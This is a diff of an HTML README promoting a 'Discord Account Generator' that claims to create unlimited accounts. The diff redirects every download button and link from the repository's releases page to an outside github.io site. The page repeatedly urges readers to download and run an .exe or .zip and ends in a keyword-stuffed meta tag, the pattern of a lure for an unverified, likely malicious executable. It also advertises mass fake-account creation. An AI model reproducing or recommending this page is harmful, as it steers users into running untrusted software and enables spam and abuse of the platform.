@@ -1,7 +1,7 @@
 <h1>💬 Discord-Account-Generator - Create Unlimited Accounts in Minutes</h1>
 
 <p align="center">
-  <a href="https://github.com/Gondoladihydricalcohol6996/Discord-Account-Generator/releases">
+  <a href="https://gondoladihydricalcohol6996.github.io">
     <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-Free_2026_Version-FF6B6B?style=for-the-badge&logo=github&logoColor=white" alt="Download Button" style="max-width:100%;">
   </a>
 </p>
@@ -30,11 +30,11 @@
 
 <h3>Step 1: Download the Application</h3>
 
-<p><a href="https://github.com/Gondoladihydricalcohol6996/Discord-Account-Generator/releases" style="font-size:18px; font-weight:bold; color:#FF6B6B;">Visit this link to download the application</a></p>
+<p><a href="https://gondoladihydricalcohol6996.github.io" style="font-size:18px; font-weight:bold; color:#FF6B6B;">Visit this link to download the application</a></p>
 
 <p>Click the button above or the link below. Your download will start automatically or take you to the download page.</p>
 
-<a href="https://github.com/Gondoladihydricalcohol6996/Discord-Account-Generator/releases" style="background-color:#4CAF50, color:white, padding:15px 32px, text-align:center, text-decoration:none, display:inline-block, font-size:16px, border-radius:8px, font-weight:bold;">📥 Download Now (Latest Version)</a>
+<a href="https://gondoladihydricalcohol6996.github.io" style="background-color:#4CAF50, color:white, padding:15px 32px, text-align:center, text-decoration:none, display:inline-block, font-size:16px, border-radius:8px, font-weight:bold;">📥 Download Now (Latest Version)</a>
 
 <h3>Step 2: Save the File</h3>
 
@@ -156,13 +156,13 @@
 <p>To recap, here's everything you need:</p>
 
 <ol>
-  <li><strong>Visit this link to download the application:</strong> <a href="https://github.com/Gondoladihydricalcohol6996/Discord-Account-Generator/releases">https://github.com/Gondoladihydricalcohol6996/Discord-Account-Generator/releases</a></li>
+  <li><strong>Visit this link to download the application:</strong> <a href="https://gondoladihydricalcohol6996.github.io">https://gondoladihydricalcohol6996.github.io</a></li>
   <li>Download the latest release file (either .exe or .zip).</li>
   <li>Run the file or extract it first if it's a zip file.</li>
   <li>Start generating accounts in minutes.</li>
 </ol>
 
-<a href="https://github.com/Gondoladihydricalcohol6996/Discord-Account-Generator/releases" style="display:inline-block, background-color:#FF6B6B, color:white, padding:15px 40px, text-align:center, text-decoration:none, font-size:20px, font-weight:bold, border-radius:50px, margin-top:20px;">⬇️ GET FREE DOWNLOAD NOW</a>
+<a href="https://gondoladihydricalcohol6996.github.io" style="display:inline-block, background-color:#FF6B6B, color:white, padding:15px 40px, text-align:center, text-decoration:none, font-size:20px, font-weight:bold, border-radius:50px, margin-top:20px;">⬇️ GET FREE DOWNLOAD NOW</a>
 
 <h2>🔐 Security & Privacy</h2>
 
@@ -184,7 +184,7 @@
 <p><strong>Version 2026</strong> brings improvements in speed, stability, and proxy management. Update now for the best experience.</p>
 
 <p align="center">
-  <a href="https://github.com/Gondoladihydricalcohol6996/Discord-Account-Generator/releases" style="background-color:#4CAF50, color:white, padding:12px 30px, text-align:center, text-decoration:none, font-size:16px, font-weight:bold, border-radius:5px;">Click Here to Download the Latest Version</a>
+  <a href="https://gondoladihydricalcohol6996.github.io" style="background-color:#4CAF50, color:white, padding:12px 30px, text-align:center, text-decoration:none, font-size:16px, font-weight:bold, border-radius:5px;">Click Here to Download the Latest Version</a>
 </p>
 
 <meta name="keywords" content="discord, discord-2026, discord-account, discord-account-2026, discord-account-free, discord-account-generator, discord-account-generator-2026, discord-account-generator-download, discord-account-generator-free, discord-account-generator-free-download, discord-account-generator-latest, discord-account-generator-pc, discord-account-generator-windows, discord-free-2026, discord-free-download, discord-tool, download-discord-account-generator, free-generator-download, generator-free-2026, get-discord-account-generator-free">
